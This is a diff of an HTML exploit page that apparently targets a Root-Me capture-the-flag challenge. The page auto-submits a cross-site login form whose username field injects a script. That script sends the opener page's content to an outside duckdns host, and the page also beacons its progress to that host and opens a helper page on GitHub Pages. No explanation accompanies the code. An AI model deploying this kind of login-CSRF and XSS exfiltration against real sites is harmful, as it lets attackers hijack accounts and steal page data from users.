@@ -1,6 +1,36 @@
-<form action="http://challenge01.root-me.org:58003/login" method="POST">
-    <input type="hidden" name="username"
-        value="&lt;script&gt;open('https:///?x')&lt;/script&gt;">
-    <input type="hidden" name="secret" value="changed">
-</form>
-<script>document.forms[0].submit();</script>
+<html>
+  <body>
+      V5
+      <img id="marker" src="https://stalehighway.duckdns.org?form_visited">
+      <form id="autoForm" method="POST" action="http://challenge01.root-me.org:58003/login">
+        <input type="hidden" name="username" value="<script>window.open('https://stalehighway.duckdns.org?c='+opener.document.getElementsByTagName('p')[3].innerHTML)</script>">
+        <input type="hidden" name="secret" value="mysecret">
+    </form>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('autoForm').submit();
+        });
+    </script>
+  </body>
+
+  <script>
+
+    let whurl = 'https://stalehighway.duckdns.org';
+    function whlog(message) {
+      document.getElementById('marker').src = whurl + "?" + message;
+    }
+
+    whlog('binding_to_domcontentloaded');
+    document.addEventListener('DOMContentLoaded', function() {
+      whlog('script_executing');
+      if (!opener) {
+        whlog('no_opener');
+        window.open('https://deviant00.github.io/x.html');
+        document.location = 'http://challenge01.root-me.org:58003/profile';
+      } else {
+        document.getElementById('autoForm').submit();
+      }
+    });
+  </script>
+</html>
